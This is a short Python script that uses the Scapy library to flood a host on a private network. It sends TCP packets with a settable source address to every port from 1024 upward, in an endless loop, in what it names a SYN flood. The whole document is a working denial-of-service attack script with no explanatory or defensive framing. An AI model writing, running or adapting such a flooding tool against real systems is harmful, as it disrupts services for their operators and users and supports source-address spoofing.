#!/usr/bin/python

from scapy.all import *

def synflood(src , dst , message):
	for dport in range(1024,65535):
		IPlayer = IP(src=src,dst=dst)
		TCPlayer = TCP(sport=444,dport=dport)
		RAWLayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWLayer
		send(pkt,iface="eth0")

src = "192.168.29.28"
dst = "192.168.29.49"
m = "Reached"
while(True):
	synflood(src , dst , m)


